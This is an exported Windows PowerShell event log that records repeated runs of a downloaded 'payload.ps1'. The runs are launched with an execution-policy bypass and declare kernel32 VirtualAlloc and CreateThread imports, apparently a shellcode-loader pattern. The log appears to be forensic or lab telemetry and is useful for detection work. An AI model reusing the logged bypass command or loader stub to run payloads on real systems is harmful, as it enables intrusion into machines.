@@ -1,0 +1,4625 @@
+﻿Level,Date and Time,Source,Event ID,Task Category
+Information,11/3/2025 1:26:39 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
+. 
+
+Context Information: 
+	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=17
+
+	UserId=WIN-SIVMS1G7J74\Administrator
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=75c378dc-a1ee-4fe3-b65c-de55c27c1625
+	PipelineId=23
+	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
+	CommandLine=$KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
+ 
+
+Details: 
+CommandInvocation(Add-Type): ""Add-Type""
+ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(""kernel32.dll"")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
+ParameterBinding(Add-Type): name=""Name""; value=""Win32""
+ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
+ParameterBinding(Add-Type): name=""PassThru""; value=""True""
+"
+Information,11/3/2025 1:26:30 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
+. 
+
+Context Information: 
+	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=15
+
+	UserId=WIN-SIVMS1G7J74\Administrator
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=75c378dc-a1ee-4fe3-b65c-de55c27c1625
+	PipelineId=20
+	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
+	CommandLine=$KEaLmybUgkgGljb = Add-Type -memberDefinition $YUnncwulCZnZLj -Name ""Win32"" -namespace Win32Functions -passthru
+ 
+
+Details: 
+CommandInvocation(Add-Type): ""Add-Type""
+ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(""kernel32.dll"")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
+ParameterBinding(Add-Type): name=""Name""; value=""Win32""
+ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
+ParameterBinding(Add-Type): name=""PassThru""; value=""True""
+"
+Information,11/3/2025 1:24:47 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=75c378dc-a1ee-4fe3-b65c-de55c27c1625
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:24:47 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=dccea6cd-fe23-42e8-b976-5227714b962c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=15f8030a-eb8d-4cda-8480-f1837646d18c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:50 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=21fbb649-aff5-49b7-b208-66a4db5cabdd
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:43 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=20
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:43 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $ifnBFunzdw = Add-Type -memberDefinition $eksMsHDMZMr -Name ""Win32"" -namespace Win32Functions -passthru
+. 
+
+Context Information: 
+	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=18
+
+	UserId=WIN-SIVMS1G7J74\Administrator
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
+	PipelineId=1
+	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
+	CommandLine=$ifnBFunzdw = Add-Type -memberDefinition $eksMsHDMZMr -Name ""Win32"" -namespace Win32Functions -passthru
+ 
+
+Details: 
+CommandInvocation(Add-Type): ""Add-Type""
+ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(""kernel32.dll"")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
+ParameterBinding(Add-Type): name=""Name""; value=""Win32""
+ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
+ParameterBinding(Add-Type): name=""PassThru""; value=""True""
+"
+Information,11/3/2025 1:23:43 AM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
+	PipelineId=5
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=0999ab35-2649-4959-baf9-69675f7dcbe9
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:42 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=59352eac-85d1-4818-8e70-8815600bc82e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:32 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=20
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=09d6a63c-06e0-453f-9c8b-4df2ca1bf969
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:31 AM,PowerShell,800,Pipeline Execution Details,"Pipeline execution details for command line: $ifnBFunzdw = Add-Type -memberDefinition $eksMsHDMZMr -Name ""Win32"" -namespace Win32Functions -passthru
+. 
+
+Context Information: 
+	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=18
+
+	UserId=WIN-SIVMS1G7J74\Administrator
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=09d6a63c-06e0-453f-9c8b-4df2ca1bf969
+	PipelineId=1
+	ScriptName=C:\Users\Administrator\Downloads\payload.ps1
+	CommandLine=$ifnBFunzdw = Add-Type -memberDefinition $eksMsHDMZMr -Name ""Win32"" -namespace Win32Functions -passthru
+ 
+
+Details: 
+CommandInvocation(Add-Type): ""Add-Type""
+ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""kernel32.dll"")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(""kernel32.dll"")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ...""
+ParameterBinding(Add-Type): name=""Name""; value=""Win32""
+ParameterBinding(Add-Type): name=""Namespace""; value=""Win32Functions""
+ParameterBinding(Add-Type): name=""PassThru""; value=""True""
+"
+Information,11/3/2025 1:23:26 AM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=09d6a63c-06e0-453f-9c8b-4df2ca1bf969
+	PipelineId=5
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=5.1.17763.2931
+	RunspaceId=09d6a63c-06e0-453f-9c8b-4df2ca1bf969
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:42 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=469
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=5eb60034-d3e6-4415-a856-c895775764fe
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=5eb60034-d3e6-4415-a856-c895775764fe
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
